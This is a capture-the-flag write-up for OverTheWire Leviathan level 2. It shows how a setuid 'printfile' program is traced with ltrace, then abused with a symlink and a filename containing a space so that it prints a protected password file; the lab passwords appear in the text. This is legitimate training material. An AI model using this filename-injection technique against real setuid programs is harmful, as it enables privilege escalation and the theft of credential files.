# Level 2

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Leviathan

## Provided Materials

- username: `leviathan2`
- password: `mEh5PNl10e`

## Solution

Let's see what do we have in directory:

```sh
leviathan2@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Oct  5  2023 .
drwxr-xr-x 83 root       root        4096 Oct  5  2023 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Oct  5  2023 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

Let's look at `printfile`:

```sh
leviathan2@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Let's analyze it with `ltrace`:

```sh
leviathan2@gibson:~$ ltrace ./printfile .profile
__libc_start_main(0x80491e6, 2, 0xffffd624, 0 <unfinished ...>
access(".profile", 4)                           = 0
snprintf("/bin/cat .profile", 511, "/bin/cat %s", ".profile") = 17
geteuid()                                       = 12002
geteuid()                                       = 12002
setreuid(12002, 12002)                          = 0
system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
...
```

It firstly checks if we can access file and only then set `setreuid(12002, 12002)`, so probably we will need a [symlink](https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/).

Let's make it:

```sh
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.erLalGKp7R
leviathan2@gibson:~$ chmod 777 /tmp/tmp.erLalGKp7R
leviathan2@gibson:~$ cd /tmp/tmp.erLalGKp7R
leviathan2@gibson:/tmp/tmp.erLalGKp7R$ ls
leviathan2@gibson:/tmp/tmp.erLalGKp7R$ ln -s /etc/leviathan_pass/leviathan3 file
leviathan2@gibson:/tmp/tmp.erLalGKp7R$ ls -al
total 16160
drwxrwxrwx    2 leviathan2 leviathan2     4096 Apr 20 14:34 .
drwxrwx-wt 2898 root       root       16535552 Apr 20 14:35 ..
lrwxrwxrwx    1 leviathan2 leviathan2       30 Apr 20 14:34 file -> /etc/leviathan_pass/leviathan3
```

But we need to find a way, so that `printfile` will allow us to see this `file`... Let's try to create filename with space:

```sh
leviathan2@gibson:~$ cd -
/tmp/tmp.erLalGKp7R
leviathan2@gibson:/tmp/tmp.erLalGKp7R$ touch "file with_space"
leviathan2@gibson:/tmp/tmp.erLalGKp7R$ cd -
/home/leviathan2
leviathan2@gibson:~$ ./printfile /tmp/tmp.erLalGKp7R/file\ with_space 
Q0G8j4sakn
/bin/cat: with_space: No such file or directory
```

And indeed, it incorrectly handles files with spaces!

## Password

`leviathan3`:`Q0G8j4sakn`

*Created by [bu19akov](https://github.com/bu19akov)*